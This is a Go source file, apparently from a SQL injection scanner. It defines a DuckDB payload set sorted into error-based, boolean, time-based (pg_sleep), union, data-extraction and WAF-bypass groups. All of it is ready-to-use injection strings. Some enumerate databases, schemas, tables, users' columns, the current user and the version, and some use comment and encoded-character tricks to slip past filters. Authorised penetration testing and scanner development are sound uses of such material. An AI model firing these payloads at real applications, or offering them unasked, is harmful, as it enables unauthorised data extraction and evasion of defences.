package payloads

var DuckDB = PayloadGroup{
	DBMS: "DuckDB",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED (CAST errors)
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=CAST(version() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(current_database() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(current_user() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT database_name FROM duckdb_databases()) AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT schema_name FROM information_schema.schemata) AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT table_name FROM information_schema.tables) AS INT)--"},
		{Type: "error", Content: "' AND CAST(1 AS VARCHAR)=CAST((SELECT table_name FROM information_schema.tables) AS VARCHAR)--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND '1'='1'--", Expected: "true"},
		{Type: "boolean", Content: "' AND '1'='2'--", Expected: "false"},
		{Type: "boolean", Content: "' OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' OR 1=2--", Expected: "false"},

		// ═══════════════════════════════════════════
		// TIME-BASED (DuckDB sleeps via pg_sleep)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "'; SELECT pg_sleep(5)--"},
		{Type: "time", Content: "'; SELECT pg_sleep(10)--"},
		{Type: "time", Content: "' AND pg_sleep(5)--"},
		{Type: "time", Content: "' AND (SELECT pg_sleep(5))--"},
		{Type: "time", Content: "') AND pg_sleep(5)--"},
		{Type: "time", Content: "'); SELECT pg_sleep(5)--"},
		{Type: "time", Content: "' UNION SELECT pg_sleep(5)--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' UNION SELECT 1--"},
		{Type: "union", Content: "' UNION SELECT 1,2--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4,5--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION ALL SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION ALL SELECT 1,2,3--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT database_name FROM duckdb_databases()--"},
		{Type: "deep", Content: "' UNION SELECT schema_name FROM information_schema.schemata--"},
		{Type: "deep", Content: "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='main'--"},
		{Type: "deep", Content: "' UNION SELECT column_name||':'||data_type FROM information_schema.columns WHERE table_name='users'--"},
		{Type: "deep", Content: "' UNION SELECT table_name||','||column_name FROM information_schema.columns--"},
		{Type: "deep", Content: "' UNION SELECT current_database()--"},
		{Type: "deep", Content: "' UNION SELECT current_user()--"},
		{Type: "deep", Content: "' UNION SELECT version()--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'%0AUNION%0ASELECT%0ANULL--"},
		{Type: "bypass", Content: "'/**/UNION/**/SELECT/**/1,2,3--"},
		{Type: "bypass", Content: "1' AND 1=1 AND '1'='1"},
		{Type: "bypass", Content: "'%00OR 1=1--"},
	},
}

